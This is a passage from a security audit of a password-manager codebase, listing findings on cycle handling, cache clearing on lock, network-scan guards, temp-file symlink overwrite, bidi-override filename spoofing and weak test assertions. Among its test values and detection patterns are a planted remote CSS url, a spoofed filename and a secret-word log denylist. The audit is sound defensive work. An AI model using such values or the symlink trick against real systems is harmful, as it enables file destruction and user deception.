  rule 5. **It is blocked by CSP, not by validation:** `src/main/security.ts:32,37` sets
  `default-src 'none'` with `img-src 'self' data: blob:`, so a remote host is refused. That is
  defence in depth working, but it is the second layer catching what the first should have. The
  CSP is deliberate and tested (`security.test.ts:80`) — but it is luck that this particular hole
  lands on a directive that happens to be locked down.
- **Not a CSS-injection escape.** `setProperty` parses the value as `<declaration-value>`; a `;`
  or unbalanced `}` makes it invalid and the call silently no-ops. There is no
  `dangerouslySetInnerHTML`, no `innerHTML`, no `insertRule`, no `adoptedStyleSheets` and no
  `<style>` string interpolation anywhere in the renderer or shared tree.

**Fix.** Make `coerceAppearance` validate rather than count: keep the palette only when
`isCompletePalette(v) && COLOUR_TOKENS.every(t => normaliseColour(v[t]).ok)`, then run it
through `normalisePalette`. Drop the **whole** palette on any bad token rather than salvaging
per token — a half-valid palette is the unreadable-app case. Same treatment for `accentColour`
(`appearance.ts:248`), also an unvalidated `string`. Ship a guard that plants
`url(https://example.invalid/x.png)` and `var(--kh-color-bg)` in a stored palette and asserts
neither reaches `toCssVariables`.

---

### N14 — MEDIUM · `breakCycles` detaches a folder that was never in a cycle

`src/main/sync/merge-collections.ts:390-407`

`seen` holds the whole walked _path_ — the starting folder and the tail leading into the cycle —
not the cycle itself. The victim is `[...seen].sort()[0]`, the canonically smallest id in the
path, so a folder that merely _points at_ a cycle can be chosen.

**Measured by reading:** with `f0.parentId = 'f1'`, `f1.parentId = 'f2'`, `f2.parentId = 'f1'`
(only f1/f2 cycle), walking from `f0` gives `seen = {f0, f1, f2}`, detects at `f1`, and picks
`victim = 'f0'` — **f0 is detached although it was never in a cycle**. The real cycle is broken
separately when `f1` is walked, so the tree does end up acyclic, but the user has lost f0's
nesting for nothing and the report emits a `folder-cycle-broken` note naming a folder that was
not in a cycle. Ids are UUID v7 and sort by creation time, so "the oldest folder in the path" is
the likely victim — exactly the long-lived folder a user would notice moving.

`merge-collections.test.ts:188-217` uses a bare two-node cycle with no tail, so it cannot see
this.

**Fix.** Track the walk as an ordered array alongside the set; on detection take the suffix from
the first occurrence of `current` — that suffix _is_ the cycle — and pick the smallest id from
it. The determinism argument in the comment is preserved and the cut lands inside the loop.

---

### N15 — MEDIUM · `clearCache()` has no production caller, so range prefixes would survive a lock

**STATUS: OPEN.** Re-read `src/main/breach/client.ts:247` and grepped `src/` for callers: still none outside the tests. It stays open for a reason that makes it currently harmless — nothing constructs a `PwnedPasswordsClient` either, so there is no cache to survive a lock. It becomes a real defect the moment the composition root in `05-Features/07-Breach-Check.md` §7 lands, and the guard belongs with the lock path rather than with `breach/`.

`src/main/breach/client.ts:214`, against the claim at `:78` — "dropped by `clearCache()`,
**which the lock path should call**".

**Measured:** `clearCache` is referenced by `client.test.ts:223` and `no-network.test.ts:323`
and by nothing else in `src/`. Nothing constructs a `PwnedPasswordsClient` in production yet, so
this is a wiring obligation rather than a live leak — but it is the kind that gets lost between
the module and the composition root.

**Why it matters when it is wired.** The cache is keyed by prefix. The set of cached prefixes is
a partial 20-bit fingerprint of the passwords in the open vault, held in main-process memory.
After a lock everything else secret is destroyed; this would not be. It is not a password and it
is not directly invertible, but it is material derived from the vault surviving the event whose
entire meaning is that nothing derived from the vault is still in memory.

**Fix.** Call `clearCache()` from wherever the session controller destroys the DEK, and assert
it from the **lock path's** tests rather than from `breach/` — the obligation belongs there, so
that is where the failure should surface.

---

### N16 — MEDIUM · Close-to-tray swallows `app.quit()`, because `prepareToQuit()` has no caller

`src/main/shell/shell-controller.ts:207-213` and `:261-263`; the missing caller belongs at
`src/main/index.ts:227`

**Measured:** a grep for `prepareToQuit` across `src/` finds exactly one hit — the comment at
`index.ts:43` saying _"without `prepareToQuit` a close-to-tray build cannot be quit at all."_
The call it describes does not exist. `NativeShell.dispose()` and `.updateSettings()` are
likewise never called.

With `closeToTray: true` and a tray present, `app.quit()` emits `before-quit` and then `close`
on the window; `onClose` sees `#quitting === false`, calls `event.preventDefault()` and hides
instead. Both File▸Exit and the tray's Quit become no-ops and the app cannot be quit from its own
UI. The security shape matters for a password manager: the user performs the gesture that means
"the keys are gone" and the process stays alive holding the DEK. (`lockOnHideToTray` defaults on,
so it does lock — but `shell-settings.ts:19-25` is explicit that "locked" and "process gone" are
different guarantees.)

**Latent today, and only just:** `closeToTray` defaults `false`, `index.ts` constructs
`NativeShell` with no `settings` and never calls `updateSettings`, and `trayIcon` defaults `null`
so `#tray === null` short-circuits `onClose`. It activates the moment settings plumbing and a
tray icon land — i.e. the next slice.

**Fix.** `app.on('before-quit', () => { shell?.prepareToQuit(); })` in `index.ts`, and
`shell?.dispose()` in `will-quit`.

---

### N17 — MEDIUM · The repository has no repo-wide network guard, only a per-directory one

**STATUS: FIXED, and the scan stayed in `src/main/breach/`.** Read `src/main/breach/no-network.test.ts` — `SRC` is `<repo>/src` and the scan walks all of it recursively, with `NETWORK_CAPABLE_PATH` naming the single file entitled to originate a request. The fix as originally written proposed promoting the file to `tools/no-network.test.ts`; it was instead widened in place, so **the path in the fix note below is wrong** and the file is at `src/main/breach/no-network.test.ts`.

`src/main/breach/no-network.test.ts:67-71` (`readdirSync(DIRECTORY)`)

Hard rule 5 is repo-wide. The guard that enforces it reads one directory, non-recursively, and
skips `.test.ts` files. A `fetch`, `node:https`, `net.request` or `XMLHttpRequest` added anywhere
else in `src/` — `sync/`, `shell/`, the renderer — fails no test. `00-Security-Audit.md` verified
the repo-wide property by hand, twice; that is a snapshot, not a guard, and it is exactly the
"a number written in prose gets a test that parses it back out" situation hard rule 9 describes.

**Measured:** I re-ran the sweep and it is still true — **exactly one `fetch` call site in
`src/`**, `src/main/breach/https-transport.ts:123`, and nothing outside `src/main/breach/`
imports that module. So there is no violation today; there is no guard either.

**Fix.** Promote the scan to `tools/no-network.test.ts`, walking all of `src/` recursively with
an allow-list of exactly one path. Keep `no-network.test.ts`'s behavioural half where it is —
the `passwordRange` spy and the booby-trapped global are about the client, not the tree.

---

### N18 — MEDIUM · `stripComments` fails open, so a string literal can blind the network scan

**STATUS: FIXED by construction.** Read `src/main/breach/no-network.test.ts`. There is no comment stripper any more: the scan reads TypeScript AST nodes, and comments are trivia that never become nodes, so the string-literal bypass cannot exist rather than being defended against. The file's header records the measured 14/14 pass under the planted bypass, and the throwaway-source-tree test plants it and asserts the scan fails.

`src/main/breach/no-network.test.ts:82-116`

The hand-rolled comment stripper tracks `/* … */` across lines. It has no notion of string
literals, so a source line containing `'/*'` inside a string starts a block comment that never
ends, and **every remaining line of that file is stripped before the scan** — including a
`fetch(` on the next line. The failure direction is open: the guard sees less, and passes.

The file is otherwise careful about exactly this hazard — the `(^|[^:])\/\/` rule exists
specifically to keep `https://` inside a string literal visible to the scan, and it works. The
block-comment path just did not get the same attention. No current file triggers it (measured),
so this is guard hardening, not a live hole.

**Fix.** Either use a real tokeniser, or invert the check: assert the _whole_ source (comments
included) contains no network API outside the transport, with a short explicit allow-list of the
prose lines that legitimately discuss `fetch`. A scan that over-matches and is allow-listed fails
closed; one that under-matches fails open.

---

### N19 — MEDIUM · `checkOrganisation` is quadratic on the main thread, and no folder cap is enforced at load

`src/main/organisation/folder-tree.ts:77` · `src/main/organisation/integrity.ts:166` and `:219`

`walkAncestors` rebuilds `new Map(folders.map(...))` on **every call**; `checkFolderParents`
calls it once per folder (O(n²) map construction), and `checkDuplicateFolderNames` calls
`childrenOf` (filter + sort) once per distinct parent for a further O(n² log n).

**Measured:** `MAX_FOLDERS = 2000` (`folder-ops.ts:58`) is enforced **only** inside `createFolder`
(`folder-ops.ts:205`). There is no folder-count check on the load or deserialise path.
`checkOrganisation` is called from `src/main/recovery/document-diagnosis.ts:278`, which is fully
synchronous with no worker — i.e. the diagnosis path, the one you run against a file you already
suspect.

A document carrying far more folders than `MAX_FOLDERS` — reachable via a merge, a partial
restore, or a hand-edited export, _not_ via CSV import, which correctly goes through
`createFolder` — spins the main process during the diagnosis pass. `folder-tree.ts:13-18` states
the module's invariant as "a malformed vault must render badly, never hang". That invariant holds
for **cycles** (verified — see the fine list) but not for **size**.

**Estimated, not measured:** at n = 2,000 this is single-digit millions of operations —
noticeable, not fatal. At n = 100,000 it is minutes of a frozen window. Not run.

**Fix.** Give `walkAncestors` an optional prebuilt `ReadonlyMap<string, Folder>` and have
`checkFolderParents`, `folderDepth`, `folderPathSegments` and `folderPathsById` build it once per
pass — that removes the dominant term. Then add a size check at the top of `checkOrganisation`
(and at document load): if `document.folders.length > MAX_FOLDERS`, emit a `too-many-folders`
issue and **skip** the per-folder walks. That converts a hang into a report, which is what the
module says it does. (`folderPathsById` at `folder-tree.ts:193` is worse still, O(n²·depth) —
measured as having no production callers today, so nothing to fix there; noted so it is not wired
up as-is.)

---

### N20 — LOW · `deleteFolder(…, 'reparent')` on a self-parented folder files records under the folder it just deleted

`src/main/organisation/folder-ops.ts:312-322`

When `folder.parentId === folderId` — a folder that is its own parent — both `:316` and `:320`
reparent to the id of the folder being removed. Its child folders become orphans and **its
records end up filed under a folder that no longer exists**: absent from every folder view,
reachable only by search. That is the failure the function's own docblock (`:299-304`) says the
policy argument exists to prevent — "data loss wearing a UI glitch's clothes".

Reaching it needs a pre-corrupt vault: `moveFolder` correctly refuses self-parenting (`:272`,
tested at `folder-ops.test.ts:202`) and `createFolder` cannot produce it, so it takes a merge, a
hand-edited export, or a partial restore. No record is destroyed — they survive and
`integrity.ts` reports them as `record-missing-folder`. Hence LOW.
`folder-ops.test.ts:353` ("leaves no record pointing at a folder that is gone") runs only over the
healthy `withRecords()` fixture and would pass unchanged with this bug present.

**Fix.** `const risenTo = folder.parentId === folderId ? null : folder.parentId;` used on both
lines, plus a fixture whose folder has `parentId === its own id`, run against the existing
property.

---

### N21 — LOW · The tray's own leak detector logs the value it detected

`src/main/shell/tray.ts:65`, with the string built at `src/main/shell/tray-model.ts:159-164`

`findTrayViolations` builds `` `tray tooltip "${model.tooltip}" is neither of the two permitted
strings` `` and `tray.ts` writes that whole string to `console.error`. The `tooltip-leak`
violation exists precisely for the case where a tooltip has grown a vault name or a path — and
the response to detecting it is to copy it into the log, which is the artefact that gets pasted
into a GitHub issue. That is the shape hard rule 1 forbids, and the exact opposite of the policy
`shell-controller.ts:104-106` states one file away ("the reason, never the path").

**And the log guard does not catch it.** `shell-hardening.test.ts:241-250` scans console arguments
against `/\bpath\b|\bargv\b|\bpassword\b|\bsecret\b|\bcredential\b|\bvalue\b/i`. The argument here
is `violation.kind` plus `violation.detail`; none of those words appear, so it passes.

**Fix.** Log `violation.kind` and, for item violations, `item.command` (a static catalogue id).
Never log `detail`. Or give `TrayViolation` a machine-readable `subject` that is safe by
construction, keeping `detail` for test assertions only.

---

### N22 — LOW · The theme writer's temp file is predictable and opened with `'w'`

`src/main/theme/keeptheme-file.ts:92` and `:99`

`` const tempPath = `${path}${THEME_TEMP_SUFFIX}` `` — a fully predictable name in a directory
the _user_ chose in a save dialog (Downloads, a synced folder, a shared volume). `open(tempPath,
'w')` follows a symlink at that location. An attacker who can create files there pre-plants
`Exported.keeptheme.tmp` as a symlink; the app truncates and writes theme JSON into the link
target. Classic predictable-temp-file overwrite. The content is only a theme, so this is
destruction of an arbitrary file rather than escalation, and on Windows symlink creation needs
privilege or developer mode — so the practical exposure is macOS.

For comparison `src/main/vault/atomic-write.ts:130` uses `open(tempPath, 'w', 0o600)` and fsyncs
the directory at `:79`. The theme writer's header at `:16-22` deliberately drops the `0o600`
(correct — themes are meant to be shareable), but the symlink question is separate from the mode
question and is not addressed.

**Fix.** `open(tempPath, 'wx')` — `O_CREAT|O_EXCL` refuses to follow a symlink and fails if the
temp exists — with a random suffix so a stale temp from a crashed run cannot permanently break
exports: `` `${path}.${randomBytes(6).toString('hex')}.tmp` ``, cleaned in the existing `catch`.

---

### N23 — LOW · `readCappedText`'s "tear the connection down promptly" cleanup never runs

`src/main/breach/https-transport.ts:98-102`

**Measured**, with a standalone Node 22 script against a real `Response` and `ReadableStream`:
`response.bodyUsed` is `false` before any read and **`true` after the first `reader.read()`** and
after `releaseLock()`. The loop always performs at least one read before it can reach the
`finally`, so `!response.bodyUsed` is never true and **`body.cancel()` is dead code**.

The path where it was supposed to matter is the early return at `:96`, when a hostile or broken
endpoint streams past `MAX_RANGE_BODY_BYTES`: the transport returns, but the underlying stream is
never cancelled, so the socket is left undrained rather than torn down. Over a sweep that
repeatedly hits the oversized path that is a resource-exhaustion vector on the one network path in
the application — and, worse for review, a line that reads as protection and is not.

**Fix.** Cancel unconditionally on the early-return path: capture whether the loop exited early
and call `reader.cancel()` (which works while the lock is held) before `releaseLock()`, or drop
the `bodyUsed` condition and let `cancel()`'s rejection be swallowed by the existing `.catch`.
Assert it — the oversized test at `https-transport.test.ts:213-240` already has the stream in hand
and can assert `pull` stops being called.

---

### N24 — LOW · `#pace` will sleep for the size of a backwards clock jump

`src/main/breach/client.ts:426-430`

`#now` is `Date.now`, which is not monotonic. If the wall clock moves backwards between setting
`#nextRequestAt` and the next `#pace()` — an NTP correction, a VM resume, a user changing the
clock — `wait` becomes the size of the jump. An hour-long jump is an hour-long sleep holding the
sweep open. It is cancellable (`#fetchOnce` checks the signal immediately after `#pace`), so the
user can stop it, but the UI shows a sweep that has simply stopped progressing with no
explanation.

**Fix.** `const wait = Math.min(this.#nextRequestAt - this.#now(), this.#requestIntervalMs);` —
the interval is by definition the longest a correct pace ever needs to wait.

---

### N25 — LOW · Two filename defects in `attachments/`

**(a) `truncate()` re-introduces the trailing dot or space that `sanitiseAttachmentName` just
removed.** `src/main/attachments/filename.ts:194-221`, called at `:254` — _after_ the `[. ]+$`
strip at `:245`. When the tail is longer than 17 characters it is not treated as an extension,
the whole name becomes the stem, and the cut can land immediately after a `.` or a space.
**Measured:** `'a'.repeat(254) + '.' + 'b'.repeat(20)` produces a 255-character result ending
`aaaaa.`; the space variant ends `aaaaa `. That breaks idempotency (`filename.test.ts:173` — a
second pass strips the dot and yields a different name) and the `:242` promise that "two
attachments that look different in the list cannot collide into one file on save", since Windows
silently drops both. The hostile fixture at `filename.test.ts:153` uses `.pdf`, a valid extension,
so it never enters this branch. **Fix:** apply the trailing-`[. ]+` strip and the empty/`FALLBACK`
check to `truncate`'s _result_, not only its input; add that input to the hostile list.

**(b) Bidi and format control characters are not stripped.** `filename.ts:58` —
`ILLEGAL_CHARACTERS` covers `U+0000–U+001F`, `U+007F` and the Windows punctuation, but not
`U+202E` (RLO) and its relatives. `invoice\u202Efdp.exe` renders in the attachment list and in the
save dialog as `invoiceexe.pdf`. `looksDisguised` returns `false` for it — there is only one real
extension — so the `disguised` warning does not fire, though `executable` still does, which is why
this is LOW. **Fix:** extend the class to `[\u200e\u200f\u202a-\u202e\u2066-\u2069\ufeff]`,
replaced with `_` like the rest, which preserves both the "two names do not silently converge"
property and idempotency. Add an RLO case to the hostile list.

---

### N26 — LOW · The directory-leak defence in `recovery/` is `path.basename`, which is platform-conditional

`src/main/recovery/survey.ts:2,252,256` and `src/main/recovery/report.ts:2,159`

`node:path`'s POSIX `basename` does not treat `\` as a separator. On macOS a Windows-shaped path
reaching `surveyVaultFiles` or `buildRecoveryReport` carries `C:\Users\<real name>\…` straight
into `SurveyedFile.name` and `RecoveryReport.vaultName` — the exact leak `survey.ts:38-43` says is
structurally impossible.

**Measured context:** `.github/workflows/verify.yml:47` is `runs-on: windows-latest`, with a
comment at `:43` saying it should become a matrix over `windows-latest` and `macos-latest`. So the
guards at `survey.test.ts:212-224` and `report.test.ts:183-199` — both of which use `C:\Users\…`
fixtures — currently execute only on Windows. **Estimated:** on a macOS runner those assertions
would _fail loudly_ rather than pass silently, so this is a portability defect that surfaces the
moment the matrix lands, not a silent hole. Worth fixing before then.

**Fix.** Use a separator-agnostic basename — `value.replace(/^.*[/\\]/, '')`, the rule
`filename.ts:43` already applies. Per hard rule 8, factor the one implementation rather than
writing a second. Change the fixtures to cover both separator styles regardless of host OS.

---

### N27 — LOW · Five more guards that would survive the bug they claim to catch

Grouped because they share a shape: the assertion is negative, and the negative is true for a
reason other than the one the test believes. (N2, N6 and N9 are the three severe members of the
same family, reported above.)

**(a) `src/main/shell/shell-hardening.test.ts:124-135` — the Electron-purity regex.** **Measured**
by running the exact regex and helper:

| source form                                                                         | `valueImportsFromElectron` returns |
| ----------------------------------------------------------------------------------- | ---------------------------------- |
| `import type {Platform} from 'electron'` then `import {app} from 'electron'`        | `["app"]` — caught                 |
| `import {type Platform} from 'electron'` then `import {app, shell} from 'electron'` | `[]` — **missed**                  |
| `import * as electron from 'electron'`                                              | `[]` — **missed**                  |
| `import electron from 'electron'`                                                   | `[]` — **missed**                  |
| `const {app} = await import('electron')`                                            | `[]` — **missed**                  |
| `const {shell} = require('electron')`                                               | `[]` — **missed**                  |

Two causes: the regex is **non-global and used with `.exec`**, so only the _first_
`import … from 'electron'` in a file is examined; and it matches only the named-import brace form.
The codebase already uses inline `type` modifiers (`shell-controller.ts:3-10`), so row two is not
contrived. The FORBIDDEN text scans at `:165-186` still catch `shell.openExternal` by name, so
this is defence-in-depth erosion rather than an open door. **Fix:** make the regex global and
iterate `matchAll`; add patterns for the default, namespace, `require(` and dynamic `import(`
forms.

**(b) `src/main/shell/shell-hardening.test.ts:239-250` — the log-content denylist.** Six words
(`path|argv|password|secret|credential|value`), which cannot see through an identifier.
`console.error('[shell] failed:', error)` passes cleanly — and a Node `fs` error's message is
`ENOENT: no such file or directory, stat 'C:\Users\…\Vaults\Personal.keep'`, the absolute path the
guard exists to exclude. Nothing in scope does this today. **Fix:** invert to an allow-list —
assert every console argument is a literal or template whose only interpolations come from a small
allowed set. The shell's logging vocabulary is deliberately tiny, so that is enforceable.

**(c) `src/main/totp/secret-field.test.ts:100` — the seed-leak assertion.**
`expect(JSON.stringify(result)).not.toContain('deadbeef')`. `'deadbeef'` is the _hex_ tail of the
fixture seed's decoded bytes (`JBSWY3DPEHPK3PXP` → `48656c6c6f21deadbeef`), but `result` is
`{ secretCode, window }` — a string and four numbers. Nothing in this codebase ever hex-encodes a
seed into a projection, so a real leak would surface as the base32 string `JBSWY3DPEHPK3PXP` or as
a `Uint8Array` serialised `{"0":72,"1":101,…}`. **Neither contains `deadbeef`.** The
`Object.keys(result).sort()` assertion one line above is doing the work. **Fix:** assert the forms
a leak would actually take.

**(d) `src/main/totp/base32.test.ts:96-97` — two `SecretBytes` redaction assertions.** Both still
pass with the redaction removed. Delete `toString()` and `String(secret)` yields
`[object SecretBytes]` via the `Symbol.toStringTag` at `src/main/crypto/secret.ts:102` — still no
`'Hello'`. Delete `toJSON()` and `JSON.stringify` yields `{"secret":{}}`, because `#bytes` is a
`#private` field and private fields are never serialised — still no `'deadbeef'`. `SecretBytes`
itself is correct. **Fix:** assert the redaction marker _positively_ through all three channels,
including `inspect()`, which is untested here.

**(e) `src/renderer/src/onboarding/onboarding-storage.test.ts:75-82` — "leaves nothing behind
anywhere else in storage either".** `MARKER` is never introduced into this test's input, so the
assertion cannot fail regardless of what `writeProgress` does. The test that _does_ plant markers
(`:41-73`) only inspects the single key `storageKeyFor(A_VAULT)` and never sweeps the rest of
storage. So the stated property is guarded by neither test. **Fix:** move the whole-storage sweep
into the contaminated test, after `writeProgress(A_VAULT, contaminated)`. The other twelve tests
in that file are sound.

---

### N28 — LOW · The `no-leak` audit-report assertion never exercises `size-mismatch`

`src/main/attachments/no-leak.test.ts:180-189`

The comment claims "Every code this module can produce is present in this one report, so the
assertion covers the whole surface." It does not: both metas carry `ID_A`, `chunkSizes` maps only
`ID_B`, and the `!present.has(meta.id)` branch `continue`s before the size check, so
**`size-mismatch` is never emitted**. Someone adding `name: meta.name` to the `size-mismatch`
issue (`audit.ts:81-87`) would ship it. **Fix:** point the metas at a present chunk with a
disagreeing size, or add a second document.

---

### N29 — LOW · Unbounded hostile strings are interpolated into `.keeptheme` warnings

`src/shared/theme/keeptheme.ts:750` (`unknown-base`) and `:792` (`unknown-token`)

Both interpolate attacker-chosen strings with no length cap and no control-character check.
`basedOn` is read as a raw `candidate.basedOn`, **not** through `readString`, so it skips the
length and control-character validation every other text field gets — a 60 KB `basedOn` yields a
60 KB warning. Palette keys are checked only for membership; an unknown key of arbitrary length
and count is echoed verbatim, so a 64 KB theme produces either one enormous warning or a few
thousand of them. Bidi-override characters are not filtered, so a warning line can be made to
render misleadingly.

Contrast `:826-828`, where a bad _colour_ value is deliberately truncated at 40 characters with
the comment "so a hostile file cannot push an essay into the UI" — the same reasoning simply was
not applied to these two paths. **Not an XSS:** these land as React text nodes, and the palette
_values_ never reach CSS un-normalised. Bounded at 64 KB by `KEEPTHEME_MAX_BYTES`.

**Fix.** Run `basedOn` through `readString(candidate, 'basedOn', 64, false)`; truncate the echoed
unknown-token key the way the colour path does; cap the number of `unknown-token` warnings.

---

### N30 — LOW · The settings screen ships no guard for its own secret handling, and its test double is dead code

`src/renderer/src/settings/fake-gateway.ts` (whole file)

**Measured:** nothing imports it — verified repo-wide for `createFakeGateway`,
`FakeSettingsGateway` and the path. Its exported affordances `passwordChanges`, `rekeyRequests`
and `failNext` have zero call sites. Its header says it records password _lengths_ so that "the
test asserting the screen does not hold one either" can be written — that test does not exist.

The two in-scope settings test files cover copy strings and shared-model clamps only. There is
**no** equivalent of `ImportWizard.test.tsx`'s planted-secret DOM sweep or `OnboardingFlow.test.tsx`'s
`localStorage` marker sweep for the one screen in scope that actually takes the master password
(`DangerZoneSection.ChangePasswordDialog`, `VaultSection.RekeyDialog`). Hard rule 9 is unmet here
while it is met everywhere else in scope.

**Fix.** Mount `SettingsScreen` against `createFakeGateway()` with the existing `mountReact`
harness, type a sentinel into all three password fields plus the rekey field, and assert (a) the
sentinel appears in no rendered string, attribute or live `.value` after submit, (b)
`passwordChanges` records only lengths, (c) `failNext('…')` produces a `saveError` and an
announcement containing no sentinel.

---

### N31 — LOW · The two master-password dialogs never unmount, so clearing depends on remembering to call it

`src/renderer/src/settings/DangerZoneSection.tsx:120,181-198` and
`src/renderer/src/settings/VaultSection.tsx:181-188,211-225`

**Measured:** both are rendered unconditionally; `RekeyDialog` returns `null` when closed but stays
mounted, so `useState` survives. **Every current exit path does call `forget()` / `setSecret('')`
— there is no leak today**, all traced.

**Reasoned risk:** this is precisely the design the export dialog rejects in writing
(`export/ExportDialog.tsx:9-13`: _"dies with the component rather than being cleared by a reset the
next person to touch this file could forget to call"_). Two specific gaps follow: (a) a vault
auto-lock while a dialog is open leaves the typed master password in renderer state — nothing here
listens for a lock; (b) clicking a different KDF preset while `RekeyDialog` is open re-targets the
same component and carries the typed password across.

**Fix.** Wrap both in `{open && <…/>}` so closing unmounts, matching `ExportDialog`.

---

### N32 — LOW · Two more stale-state and cleanup gaps in the renderer

**(a) Master-password strength estimate has no staleness guard, so the gate can fail open.**
`src/renderer/src/onboarding/MasterPasswordStep.tsx:86-97`. **Measured:** the debounce timer is
cleared, but an already-dispatched IPC estimate is not cancelled and its `.then` is unconditional.
The sibling implementation in `use-export-dialog.ts:155-174` carries a `stale` flag for exactly
this call. **Reasoned consequence:** with two estimates in flight resolving out of order,
`strength` can describe a password other than the one in the field — and in the dangerous
direction (type a strong passphrase, delete most of it) a late-arriving `meetsMasterMinimum: true`
leaves `canCreateVault(draft)` true (`onboarding-state.ts:96,123`) for a password the estimator
would reject. Whether `onCreateVault` re-checks in the main process was not traced; if it does,
this degrades to a UI inconsistency. **Fix:** copy the `stale` pattern from
`use-export-dialog.ts`.

**(b) `attachVault` does not clear the previous vault's folders and tags before reloading.**
`src/renderer/src/organisation/organisation-store.ts:198-221`. It resets `selection`, `expanded`
and `focusedFolderId`, then awaits `refresh()` — but never clears `folders`, `tags` or `tree`, and
`refresh()`'s catch deliberately keeps the old tree on screen (`:217-220`), which is correct for a
re-read of the same vault and wrong immediately after a switch. Open vault A (a folder named
"Divorce lawyer"), lock, open vault B, and if `kh:organisation:list` fails, **vault B's sidebar
shows vault A's folder and tag names**. Largely masked today because the organisation IPC bridge
does not exist and `ipc-gateway.ts:136-139` returns `EMPTY_SNAPSHOT` rather than throwing — **the
bug lands the day the bridge does**. The module next door already argues this matters
(`expansion-storage.ts:12`: _"it would leak a little structure between vaults"_). Relatedly,
nothing clears this store on lock, while `recent-commands.ts` and `ClearToastsOnLock` both do.
**Fix:** include `folders: [], tags: [], tree: EMPTY_TREE, lastDeletion: null` in `attachVault`'s
reset, and add a lock subscription following `watchLockForRecents`.

---

### N33 — LOW · Guards promised in prose that do not exist

- **`src/renderer/src/organisation/tree-keyboard.ts:20`** — _"`tree-keyboard.test.ts` drives it
  directly"_ — and **`folder-counts.ts:24`** — _"`folder-counts.test.ts` asserts this agrees with
  the shared walk"_. **Measured:** `organisation/` contains exactly one test file,
  `folder-tree-model.test.ts`. Neither named file exists. This matters more than the usual
  missing-test note because both docblocks argue that being a pure function is what makes the
  module trustworthy — `tree-keyboard.ts:19`: _"this is the part of a tree that is easy to get
  subtly wrong and impossible to check by clicking."_ The whole ARIA key map is unasserted. Also
  untested in that directory, in rough order of what a regression would cost: `expansion-storage.ts`
  (the `localStorage` boundary, with a documented "tests can hand in a hostile fake" seam that
  nothing uses), `move-targets.ts` (`canDropFolder` is the cycle guard for drag-and-drop),
  `selection.ts` (N6 lives here), `smart-views.ts`, `drag-payload.ts`.
- **`src/main/organisation/folder-ops.ts:205` and `tag-ops.ts:271`** — `MAX_FOLDERS`,
  `tooManyFolders`, the 500-valued `MAX_TAGS` and `tooManyTags` appear only in source, never in a
  test, and the error codes `TOO_MANY_FOLDERS`/`TOO_MANY_TAGS` are declared and never exercised.
  Every neighbouring limit has a real test; these two are the outliers, and N19 is what happens
  when a cap is not enforced everywhere.
- **`src/renderer/src/organisation/fake-gateway.ts`** — 253 lines describing itself as _"a written
  specification of what the real implementation has to do"_ and _"the contract test that runs
  against this can be pointed at the real thing"_, with **zero importers anywhere in `src/`**. It
  is not in the production bundle (an unreferenced module in an ESM graph is never bundled), so the
  brief's reachability question is answered: no. The problem is the other direction — it cannot
  drift-check anything. Either write the contract test it was built for (which would close most of
  the gaps above at once) or delete it and move the rules into `gateway.ts`.

---

### N34 — LOW · Four smaller renderer defects

- **`src/renderer/src/commands/palette-store.ts:86,99-109` — `loadPlatform` never retries.**
  `platformRequest ??= …getPlatform().then(…).catch(() => {})` — the `.catch` resolves the promise
  and `??=` means the memo is never cleared. One failed IPC call leaves `platform` `null` for the
  life of the window, which by design removes every shortcut label (`CommandPalette.tsx:340`), drops
  `aria-keyshortcuts` (`:193`), and makes **the entire shortcuts help sheet render a loading
  skeleton forever** (`ShortcutsHelp.tsx:64-65`) — the one thing a confused user reaches for.
  **Fix:** clear the memo in the catch so a later mount retries, and give `ShortcutsHelp` a terminal
  state.
- **`src/renderer/src/theme-studio/theme-file-bridge.ts:115-160` — the browser transport can leak a
  DOM node and never settle.** `openTheme()` resolves only from the `cancel` or `change` listener,
  and both listeners plus the appended `<input type="file">` are removed only inside `finish`. If
  the OS dialog is dismissed in a way that fires neither, the promise never resolves and
  `ThemeStudio.importTheme` never returns. Chromium fires `cancel` from 113 so a packaged build is
  fine today, and the native transport takes over once `window.keyhold.theme` exists — filed because
  the failure is silent and permanent. **Fix:** also finish from a one-shot
  `window.addEventListener('focus', …, {once:true})` armed after `input.click()`.
- **`src/renderer/src/export/ParcelConfirm.tsx:72` — `autoFocus` against a dialog that manages focus
  itself.** `ExportDialogBody.tsx:69-71` moves focus to the step heading on every `step` change and
  documents why (so a screen-reader user arrives _before_ the warning and the loss list). Two
  `focus()` calls in one commit — the exact race `MasterPasswordStep.tsx:159-161` and
  `OnboardingFlow.tsx:34-38` both refuse to create. Either the heading wins (the `autoFocus` is dead
  code) or the input wins and the keyboard user lands in a password field having heard nothing about
  the step. **Fix:** drop `autoFocus`; the dialog owns focus.
- **`src/renderer/src/import/WarningList.tsx:28-29` hard-codes a DOM id** where every sibling uses
  `useId`. Only one instance renders at a time today (`ReviewStep.tsx:114`,
  `ImportResultPanel.tsx:85` are different steps), so no duplicate occurs — but a second instance
  would silently produce duplicate ids and a mis-pointed `aria-labelledby`. **Fix:** `useId()`.

---

### N35 — LOW · A tag can only be renamed by double-click; there is no keyboard path

`src/renderer/src/organisation/TagFilterList.tsx:155-157`

**Measured:** `onBeginRename(tag.id)` has exactly one call site, `onDoubleClick`. There is no
toolbar, no context menu and no key handler on the row. The folder tree solved this properly —
`FolderTree.tsx:343-390` is a `role="toolbar"` with New/Rename/Move/Delete acting on the selection,
and its docblock explains why. The tag list got none of it. WCAG 2.1.1: a keyboard or
screen-reader user cannot rename a tag at all, and it also excludes touch, where double-click is
not a gesture.

**Fix.** Add a small `role="toolbar"` under the tag list mirroring `FolderTree`'s, with a Rename
button enabled when exactly one tag is selected — or an F2 handler on the focused row. Keep
double-click as the shortcut, as the folder tree does with drag.

A weaker sibling, same family: **`src/renderer/src/import/import.css:262-264`** gives the import
format cards and per-duplicate action cards a `:focus-within` border-colour change, where the
identical export control (`export.css:116-119`, `:209-212`) draws
`outline: 2px solid var(--kh-color-focus-ring)` on `:has(:focus-visible)`. `:focus-within` also
fires on mouse click, so the indicator stops meaning "keyboard is here", and a border-colour change
is a colour-only signal. The native radio's own ring is still present in both, so this is not a
WCAG failure — it is an inconsistency on the wizard carrying the most consequential choice on the
screen. Mirror the export rule.

---

### N36 — INFORMATIONAL · `MAX_RANGE_BODY_BYTES` counts UTF-16 code units, not bytes

`src/main/breach/range.ts:47` and `:88`, and `src/main/breach/https-transport.ts:96`

The same class as S11 in `00-Security-Audit.md`. A hostile endpoint answering with 1 Mi
astral-plane characters is roughly 4 MiB of V8 heap. Still bounded, and `parseRangeBody` rejects
the body as `oversized` regardless, so this is not a hole — the constant's name just promises
something it does not measure, in the one file that reads attacker-controlled bytes. **Fix:**
